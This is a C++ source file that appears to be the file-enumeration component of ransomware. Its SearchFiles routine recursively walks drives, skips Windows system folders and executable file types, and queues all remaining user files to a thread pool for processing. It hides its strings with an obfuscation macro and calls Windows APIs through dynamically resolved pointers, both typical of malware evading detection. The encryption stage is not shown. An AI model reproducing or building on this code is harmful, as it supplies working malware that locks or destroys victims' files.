#include "filesystem.h"
#include "../api/getapi.h"
#include "../obfuscation/MetaString.h"
#include "../logs/logs.h"
#include "../threadpool/threadpool.h"
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

// ORIGINAL

VOID filesystem::SearchFiles(std::wstring StartDirectory, INT ThreadPoolID)
{
	WIN32_FIND_DATAW FindData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	std::wstring SearchPath = StartDirectory;
	if (SearchPath.back() != L'\\') {
		SearchPath += L"\\";
	}

	std::wstring SearchMask = SearchPath + L"*";

	hFind = pFindFirstFileW(SearchMask.c_str(), &FindData);
	if (hFind == INVALID_HANDLE_VALUE) {
		return;
	}

	do {

		// Skip . and ..
		if (plstrcmpW(FindData.cFileName, L".") == 0 ||
			plstrcmpW(FindData.cFileName, L"..") == 0) {
			continue;
		}

		std::wstring FullPath = SearchPath + FindData.cFileName;

		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

			// Skip system directories
			if (plstrcmpiW(FindData.cFileName, OBFW(L"Windows")) == 0 ||
				plstrcmpiW(FindData.cFileName, OBFW(L"Program Files")) == 0 ||
				plstrcmpiW(FindData.cFileName, OBFW(L"Program Files (x86)")) == 0 ||
				plstrcmpiW(FindData.cFileName, OBFW(L"$Recycle.Bin")) == 0 ||
				plstrcmpiW(FindData.cFileName, OBFW(L"System Volume Information")) == 0 ||
				plstrcmpiW(FindData.cFileName, OBFW(L"PerfLogs")) == 0) {
				continue;
			}

			// Recurse into subdirectory via threadpool
			threadpool::PutTask(ThreadPoolID, FullPath);

		}
		else {

			// Check file extension whitelist (skip executables/system files)
			LPCWSTR Extension = PathFindExtensionW(FindData.cFileName);
			if (Extension) {
				if (plstrcmpiW(Extension, OBFW(L".exe")) == 0 ||
					plstrcmpiW(Extension, OBFW(L".dll")) == 0 ||
					plstrcmpiW(Extension, OBFW(L".sys")) == 0 ||
					plstrcmpiW(Extension, OBFW(L".msi")) == 0 ||
					plstrcmpiW(Extension, OBFW(L".lnk")) == 0) {
					continue;
				}
			}

			// Submit file for processing
			threadpool::PutTask(ThreadPoolID, FullPath);

		}

	} while (pFindNextFileW(hFind, &FindData));

	pFindClose(hFind);
}
